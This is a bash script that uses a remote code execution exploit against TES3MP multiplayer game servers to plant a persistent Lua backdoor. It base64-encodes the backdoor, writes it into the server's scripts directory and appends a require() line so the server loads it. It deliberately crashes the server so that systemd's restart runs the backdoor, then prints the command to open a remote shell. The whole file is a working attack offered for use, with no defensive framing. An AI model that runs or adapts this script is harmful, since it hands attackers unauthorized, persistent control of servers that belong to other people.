#!/usr/bin/env bash
# Install the Lua /rce backdoor via the exploit's code execution. The command runs as the service user and
# writes into the server's OWN script tree; serverCore require()s it, and systemd restarts the crashed server
# ~5s later into a healthy process that loads the backdoor. Then use `tes3mp-rce --shell` to drive it.
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT="${EXPLOIT:-$HERE/../tes3mp-rce}"
SCRIPTS_DIR="/opt/TES3MP/server/scripts"
PW=""
while getopts "P:d:h" o; do case $o in
  P) PW="$OPTARG";;
  d) SCRIPTS_DIR="$OPTARG";;
  h) echo "usage: $0 [-P serverpass] [-d scripts_dir] host [port]"; exit 0;;
esac; done
shift $((OPTIND-1))
HOST="${1:?usage: $0 [-P serverpass] [-d scripts_dir] host [port]}"; PORT="${2:-25565}"
[ -x "$EXPLOIT" ] || { echo "build the exploit first: make"; exit 1; }
B64="$(base64 < "$HERE/rce.min.lua" | tr -d '\n')"
INSTALL="D='$SCRIPTS_DIR'; mkdir -p \"\$D/custom\"; printf %s '$B64' | base64 -d > \"\$D/custom/rce.lua\"; grep -q 'custom/rce' \"\$D/customScripts.lua\" 2>/dev/null || printf '\nrequire(\"custom/rce\")\n' >> \"\$D/customScripts.lua\""
ARGS=(); [ -n "$PW" ] && ARGS+=(-P "$PW")
echo "[*] installing /rce backdoor into $SCRIPTS_DIR on $HOST:$PORT"
echo "    (this crashes the game server; systemd's restart loads the backdoor into a healthy process)"
"$EXPLOIT" "${ARGS[@]}" -c "$INSTALL" "$HOST" "$PORT"
echo
echo "[*] give the server a few seconds to restart, then open a shell:"
echo "    $HERE/../tes3mp-rce --shell ${PW:+-P '$PW' }-n rce $HOST $PORT"
